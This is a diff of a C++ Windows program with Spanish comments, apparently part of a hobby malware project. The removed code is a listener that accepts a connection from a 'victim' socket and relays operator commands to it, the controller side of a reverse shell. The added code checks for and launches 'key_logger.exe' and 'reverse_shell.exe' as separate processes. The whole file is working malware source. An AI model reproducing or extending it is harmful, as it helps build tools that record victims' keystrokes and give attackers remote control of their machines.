@@ -1,103 +1,40 @@
-#include <WinSock2.h>
 #include <iostream>
-#include <string>
-#include <thread>
-#include <future>
-#include <WS2tcpip.h>
+#include <fstream>
+#include <Windows.h>
+#include "errors.hpp"
 #pragma comment(lib, "Ws2_32.lib")
 
-#define port "28129"
+// TODO: Arreglar el tema de q el hilo secundario aun sigue aun q se cause un error en el hilo principal causa error
 
-// TODO: Añadir limpieza y to eso (WSACleanup y liberar variables)
 
-// TODO: Separar las funciones y mensajes de error a otro archivo, por ahora este se queda aca
-
-void error(const char *message, int type)
-{
-    std::cerr << "ERROR " << message << " WITH CODE " << type << std::endl;
-    std::cin.get();
-    exit(-1);
-}
-
+#define key_logger_name "key_logger.exe"
+#define reverse_shell_name "reverse_shell.exe"
 int main()
 {
-    int r = 0;
-    SOCKET listening_socket = INVALID_SOCKET;
-    SOCKET victim_socket = INVALID_SOCKET;
-    WSADATA init;
-
-    r = WSAStartup(MAKEWORD(2, 2), &init);
-    if (r != 0)
+    std::ifstream key_logger_file(key_logger_name);
+    if (!key_logger_file.good())
     {
-        error("WSA no se inicio correctamente", WSAGetLastError());
+        std::string path;
+        path = "falta el archivo ";
+        path += key_logger_name;
+        error(path.c_str(), -1);
+    }
+    std::ifstream reverse_shell_file(reverse_shell_name);
+    if (!reverse_shell_file.good())
+    {
+        std::string path;
+        path = "falta el archivo ";
+        path += reverse_shell_name;
+        error(path.c_str(), -1);
     }
 
-    struct addrinfo address_inf;
-    ZeroMemory(&address_inf, sizeof(address_inf));
-    address_inf.ai_protocol = IPPROTO_TCP;
-    address_inf.ai_family = AF_INET;
-    address_inf.ai_socktype = SOCK_STREAM;
-    address_inf.ai_flags = AI_PASSIVE;
-    struct addrinfo *result = NULL;
-
-    r = getaddrinfo(NULL, port, &address_inf, &result);
-    if (r != 0)
+    STARTUPINFO si = {sizeof(si)};
+     STARTUPINFO si2 = {sizeof(si2)};
+    PROCESS_INFORMATION pi;
+    PROCESS_INFORMATION pi2;
+    if (!CreateProcess(NULL, (LPSTR) reverse_shell_name, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)
+    || !CreateProcess(NULL, (LPSTR) key_logger_name, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2))
     {
-        error("no se pudo obtener la informacion de direccion del server", WSAGetLastError());
+        error("no se pudo crear los procesos de dependencias", GetLastError());
     }
-
-    listening_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-    if (listening_socket == INVALID_SOCKET)
-    {
-        error("no se pudo conectar al socket listener", WSAGetLastError());
-    }
-
-    r = bind(listening_socket, result->ai_addr, (int)result->ai_addrlen);
-    if (r == SOCKET_ERROR)
-    {
-        error("no se pudo conectar el listener con la ip", WSAGetLastError());
-    }
-
-    freeaddrinfo(result);
-
-    r = listen(listening_socket, SOMAXCONN);
-    if (r == SOCKET_ERROR)
-    {
-        error("no se pudo escuchar en el socket listener", WSAGetLastError());
-    }
-    victim_socket = accept(listening_socket, NULL, NULL);
-    if (victim_socket == INVALID_SOCKET)
-    {
-        error("no se pudo conectar al socket de la victima", WSAGetLastError());
-    }
-    closesocket(listening_socket);
-    std::cout << "To bien " << victim_socket << std::endl;
-
-    // TODO: Mover esto a otra parte o ponerlo en una clase
-    auto th = std::async(std::launch::async, [&]
-                         {
-        while (true){
-            std::string buf;
-            std::getline(std::cin,buf);
-            int r = send(victim_socket,buf.c_str(),buf.size(),NULL);
-            if (r < 0){
-                error("no se pudo enviar mensaje",WSAGetLastError());
-            }
-        } });
-
-    while (true)
-    {
-        char bufc[100];
-        memset(bufc, 0, sizeof(bufc));
-        r = recv(victim_socket, bufc, sizeof(bufc), NULL);
-        if (r > 0)
-        {
-            std::cout << bufc << std::endl;
-        }
-        else if (r < 0)
-        {
-            error("no se recibio bien el mensaje", WSAGetLastError());
-        }
-    }
-    return 0;
 }
